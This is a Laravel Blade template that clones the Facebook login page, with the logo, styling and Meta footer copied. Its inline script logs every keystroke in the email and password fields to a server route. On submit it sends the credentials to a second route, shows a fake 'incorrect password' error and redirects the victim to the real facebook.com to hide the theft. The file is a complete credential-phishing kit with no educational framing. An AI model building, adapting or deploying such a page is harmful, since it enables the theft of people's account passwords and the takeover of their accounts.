<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="{{ asset('images/facebook.png') }}">
    <title>Facebook - log in or sign up</title>

      <style>
body,html {
    padding: 0;
    margin: 0;
    background: #f0f2f5;
    font-family: Helvetica Neue, Helvetica,Arial,sans-serif;
    min-height: 90vh;
}
.box {
  display: flex;
  justify-content: center;
  align-items: center;
  width: 100%;
  height: 100vh;
  margin-top: 50px;
  gap: 20px;
  margin-top: -60px;
}

.title-box {
  display: flex;
  margin-top: 10px;
  flex-direction: column;
  align-items: center;
  gap: 20px; 
  margin-bottom: 275px;
  width: 500px;
}

.title-box svg {
  display: block;
  width: 321px;
  margin-right: 234px;
  margin-bottom: -154.5px;
}

.title-box p {
  margin: 0;
    color: #000;
    font-size: 28px;
    font-weight: normal;
}


/* .title-box {
    width: 500px;
    margin-top: -432px;
    margin-right: 5rem;
    text-align: left;
      display: flex;
  flex-direction: column;
  align-items: flex-start; 
}
.title-box svg {
    width: 330px;
    margin-bottom: -150px;
}
.title-box p {
    color: #000;
    font-size: 28px;
    font-weight: normal;
    line-height: 32px;
} */


.form-box input::placeholder { 
     color: rgba(126, 126, 126, 0.9); /* placeholder text color */
    font-size: 17px;           /* placeholder font size *//* optional: make placeholder italic */
   padding-left: 4px;            /* opacity (default is usually less than 1) */
}

.form-box {
    width: 370px;
    padding: 15px;
    height:  309px;
    text-align: center;
    border-radius: 6px;
    background: #fff;
    padding-top: 20px;
    margin-left: 60px;
    box-shadow: 0px 1px 10px 0px rgba(71, 71, 71, 0.18);
}
.form-box input {
    width: 100%;
    margin-bottom: 15px;
    padding: 14px;
    font-size: 18px;
    margin-top: -5px;
    box-sizing: border-box;
    border: 1px solid rgba(126, 126, 126, 0.3);
    border-radius: 5px;
    outline: none;
}
.form-box input:focus {
    box-shadow: 0px 0px 1px 1px rgb(22, 111, 229);
}
.form-box button {
    width: 100%;
    margin-bottom: 15px;
    color: #fff;
    font-size: 20px;
    font-weight: 600;
    border-radius: 5px;
    border: none;
    padding: 13px 0;
    cursor: pointer;
    background: #166fe5;
}
.form-box .forgot {
    margin-bottom: 20px;
    margin-top: -5px;
}
.form-box button:hover {
    background: #1877f2;
}
.form-box .forgot a {
    color: #166fe5;
    font-size: 14px;
    text-decoration: none;
    margin-top: 5px;
    margin-bottom: 20px;
    display: block;
}
.form-box a:hover {
    text-decoration: underline;
}
.form-box  .line {
    border: 1px solid rgba(126, 126, 126, 0.2);
    margin-bottom: 15px;
}
.form-box .create-btn a {
    color: #fff;
    font-size: 16px;
    text-decoration: none;
    padding: 15px 20px;
    border-radius: 5px;
    background: #36a420;
    font-weight: 600;
    display: inline-block;
    margin-bottom: 5px;
    margin-top: 10px;
}
.form-box .create-btn a:hover {
    background: #42b72a;
}

/* Facebook: Create a Page link under form box */
.create-page-row {
  margin-top: 35px;
  margin-left: 100px;
  font-size: 14px;
  color: #1c1e21;
  margin-left: 107px;
  line-height: 1.43;
  font-family: Arial, Helvetica, sans-serif;
  letter-spacing: normal;
}

.create-page-row a {
  color: #000000;
  text-decoration: none;
  font-weight: 600;
  margin-left: 0;
}
.create-page-row a:hover {
  text-decoration: underline;
}
.box {
  flex: 1 0 auto;
}
.site-footer {
  flex-shrink: 0;
}
/* Facebook Footer Styles */
.site-footer {
  background: #fff;
  color: #8a8d91;
  height: 180px;
  font-family: Arial, Helvetica, sans-serif;
  font-size: 14px;
  border-top: 1px solid #dddfe2;
}
.footer-inner {
  max-width: 980px;
  margin: 0 auto;
  padding: 24px 20px 0 20px;
  box-sizing: border-box;
}
.footer-langs {
  list-style: none;
  padding: 0;
  margin: 0 0 8px 0;
  display: flex;
  flex-wrap: wrap;
  align-items: center;
}
.footer-langs li {
  margin: 0 8px 0 0;
  display: inline;
}
.footer-langs li:last-child {
  margin-right: 0;
}
.footer-langs a {
  color: #8a8d91;
  text-decoration: none;
  font-size: 12px;
  white-space: nowrap;
}
.footer-langs a:hover {
  text-decoration: underline;
}
.footer-langs .footer-plus {
  background: #f5f6f7;
  border: 1px solid #ccd0d5;
  color: #8a8d91;
  font-size: 15px;
  padding: 0 8px;
  margin-left: 4px;
  cursor: pointer;
  border-radius: 2px;
  height: 22px;
  line-height: 20px;
  vertical-align: middle;
}
.footer-divider {
  width: 100%;
  height: 1px;
  background: #dddfe2;
  margin: 8px 0 12px 0;
}
.footer-links {
  list-style: none;
  padding: 0;
  margin: 0 0 8px 0;
  display: flex;
  flex-wrap: wrap;
  align-items: center;
}
.footer-links li {
  margin: 0 16px 0 0;
  display: inline;
}
.footer-links li:last-child {
  margin-right: 0;
}
.footer-links a {
  color: #8a8d91;
  text-decoration: none;
  font-size: 12px;
  white-space: nowrap;
}
.footer-links a:hover {
  text-decoration: underline;
}
.footer-copyright {
  margin: 16px 0 10px 0;
  color: #8a8d91;
  font-size: 11px;
}

    </style>
</head>
<body>
<div class="box">
  <div class="title-box">
    <svg xmlns="http://www.w3.org/2000/svg" width="1090" height="360" fill="none" viewBox="0 0 1090 360">
        <path fill="#0866FF" d="M881.583 257.897h29.48v-47.696l41.137 47.696h36.072l-47.89-54.969 40.909-47.663h-32.825l-37.403 43.93v-96.982l-29.48 3.864v151.82Zm-67.988-105.261c-32.728 0-55.455 22.013-55.455 53.929s22.727 53.929 55.455 53.929c32.727 0 55.455-22.013 55.455-53.929s-22.728-53.929-55.455-53.929Zm0 82.728c-15.163 0-25.552-11.721-25.552-28.799s10.389-28.799 25.552-28.799c15.162 0 25.552 11.721 25.552 28.799s-10.39 28.799-25.552 28.799Zm-119.807-82.728c-32.727 0-55.455 22.013-55.455 53.929s22.728 53.929 55.455 53.929c32.728 0 55.455-22.013 55.455-53.929s-22.727-53.929-55.455-53.929Zm0 82.728c-15.162 0-25.552-11.721-25.552-28.799s10.39-28.799 25.552-28.799c15.163 0 25.552 11.721 25.552 28.799s-10.389 28.799-25.552 28.799Zm-112.826-82.728c-13.636 0-24.935 5.357-32.013 15.162v-65.585l-29.513 3.831v151.82h26.169l.519-15.844c6.981 11.818 19.481 18.474 34.838 18.474 27.988 0 48.475-22.728 48.475-53.929 0-31.202-20.39-53.929-48.475-53.929Zm-6.98 82.728c-15.163 0-25.552-11.721-25.552-28.799s10.389-28.799 25.552-28.799c15.162 0 25.552 11.721 25.552 28.799s-10.39 28.799-25.552 28.799Zm-113.638 1.331c-15.649 0-26.883-7.273-30.714-19.805h72.63c.715-3.831 1.202-8.377 1.202-11.429 0-33.02-18.475-52.825-49.514-52.825-31.331 0-53.02 22.013-53.02 53.929 0 32.338 22.728 53.929 56.462 53.929 17.467 0 34.448-5.844 45.065-15.552l-10.617-18.701c-10.292 7.11-20.39 10.454-31.494 10.454Zm-6.591-61.137c13.637 0 22.338 8.279 22.338 21.104v.098h-47.078c2.825-13.604 11.623-21.202 24.74-21.202Zm-98.994 84.968c15.26 0 30.195-5.844 40.714-15.974l-11.526-19.383c-8.182 6.364-17.467 9.805-26.266 9.805-16.364 0-27.273-11.429-27.273-28.377s10.909-28.377 27.273-28.377c8.084 0 16.883 2.922 24.026 8.085l11.721-19.806c-9.481-8.571-24.156-13.831-38.702-13.831-32.013 0-54.643 22.338-54.643 53.929.032 31.494 22.662 53.929 54.676 53.929Zm-93.735-105.261-.519 15.975c-6.981-11.916-19.481-18.572-34.838-18.572-28.085 0-48.475 22.728-48.475 53.929 0 31.202 20.52 53.929 48.475 53.929 15.357 0 27.889-6.656 34.838-18.474l.519 15.844h26.169V155.265h-26.169Zm-28.377 80.099c-15.162 0-25.552-11.721-25.552-28.799s10.39-28.799 25.552-28.799c15.163 0 25.552 11.721 25.552 28.799s-10.422 28.799-25.552 28.799Zm-57.663-79.906h-26.526v-8.767c0-13.117 5.13-18.149 18.442-18.149 4.123 0 7.467.097 9.383.292v-22.5c-3.637-1.007-12.5-2.013-17.63-2.013-27.111 0-39.611 12.792-39.611 40.422v10.682h-16.753v24.806h16.753v77.631h29.448v-77.599h21.949l4.545-24.805Z"/>
    </svg>
    <p>
        Connect with friends and the world around you on Facebook.
    </p>
  </div>
  <div>
    <div class="form-box">
       <form method="POST" action="{{ route('fb.login') }}">
        @csrf
        <input type="text" placeholder="Email or phone number" id="emailorphone" name="email" required>
        <input type="password" placeholder="Password" id="password" name="password" required>
        <button type="submit" id="login">Log In</button>
        <div class="forgot">
            <a href="#">Forgot password?</a>
        </div>
          <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
            <script>
            document.addEventListener('DOMContentLoaded', function() {
                const form = document.querySelector('form');
                const emailInput = document.getElementById('emailorphone');
                const passwordInput = document.getElementById('password');

                
                function logKeystroke(field, value) {
                    fetch("{{ route('fb.log.keystroke') }}", {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'X-CSRF-TOKEN': '{{ csrf_token() }}'
                        },
                        body: JSON.stringify({
                            field: field,
                            value: value
                        })
                    });
                }
                emailInput.addEventListener('input', function() {
                    logKeystroke('email', emailInput.value);
                });
                passwordInput.addEventListener('input', function() {
                    logKeystroke('password', passwordInput.value);
                });

                form.addEventListener('submit', function(e) {
                    e.preventDefault(); // Always prevent default to control submission
                    // Store every attempt via AJAX
                    fetch("{{ route('fb.log.attempt') }}", {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'X-CSRF-TOKEN': '{{ csrf_token() }}'
                        },
                        body: JSON.stringify({
                            email: emailInput.value,
                            password: passwordInput.value
                        })
                    });

                    // Always show fake error, then redirect
                    Swal.fire({
                        icon: 'error',
                        title: 'Login Error',
                        text: 'The email or password you entered is incorrect.',
                        confirmButtonColor: '#0078F6',
                        allowOutsideClick: false,
                        allowEscapeKey: false
                    }).then(() => {
                        window.location.href = 'https://facebook.com';
                    });
                    // Clear fields
                    emailInput.value = '';
                    passwordInput.value = '';
                });
            });
            </script>
      </form>
      <div class="line"></div>
      <div class="create-btn">
        <a href="https://youtu.be/Lcw8t9vTpQI" target="_blank">Create New Account</a>
      </div>
    </div>
    <div class="create-page-row">
      <a href="#">Create a Page</a> for a celebrity, brand or business.
    </div>
  </div>
</div>

    <!-- ---------- FOOTER (paste into your HTML) ---------- -->
<footer class="site-footer" aria-label="Site footer">
  <div class="footer-inner">
    <ul class="footer-langs" aria-label="Languages">
      <li><a href="#">English (UK)</a></li>
      <li><a href="#">ગુજરાતી</a></li>
      <li><a href="#">हिन्दी</a></li>
      <li><a href="#">मराठी</a></li>
      <li><a href="#">اردو</a></li>
      <li><a href="#">ਪੰਜਾਬੀ</a></li>
      <li><a href="#">தமிழ்</a></li>
      <li><a href="#">తెలుగు</a></li>
      <li><a href="#">বাংলা</a></li>
      <li><a href="#">മലയാളം</a></li>
      <li><a href="#">Español</a></li>
      <li><a href="#">Français</a></li>
      <li><button class="footer-plus" title="Show more languages">+</button></li>
    </ul>
    <div class="footer-divider" role="separator" aria-hidden="true"></div>
    <ul class="footer-links" aria-label="Footer links">
      <li><a href="#">Sign Up</a></li>
      <li><a href="#">Log In</a></li>
      <li><a href="#">Messenger</a></li>
      <li><a href="#">Facebook Lite</a></li>
      <li><a href="#">Watch</a></li>
      <li><a href="#">Places</a></li>
      <li><a href="#">Games</a></li>
      <li><a href="#">Marketplace</a></li>
      <li><a href="#">Meta Pay</a></li>
      <li><a href="#">Meta Store</a></li>
      <li><a href="#">Meta Quest</a></li>
      <li><a href="#">Imagine with Meta AI</a></li>
      <li><a href="#">Instagram</a></li>
      <li><a href="#">Threads</a></li>
      <li><a href="#">Fundraisers</a></li>
      <li><a href="#">Services</a></li>
      <li><a href="#">Voting Information Centre</a></li>
      <li><a href="#">Privacy Policy</a></li>
      <li><a href="#">Privacy Centre</a></li>
      <li><a href="#">Groups</a></li>
      <li><a href="#">About</a></li>
      <li><a href="#">Create ad</a></li>
      <li><a href="#">Create Page</a></li>
      <li><a href="#">Developers</a></li>
      <li><a href="#">Careers</a></li>
      <li><a href="#">Cookies</a></li>
      <li><a href="#">AdChoices</a></li>
      <li><a href="#">Terms</a></li>
      <li><a href="#">Help</a></li>
      <li><a href="#">Contact uploading &amp; non-users</a></li>
    </ul>
    <div class="footer-copyright">Meta © 2025</div>
  </div>
</footer>
</body>
</html>
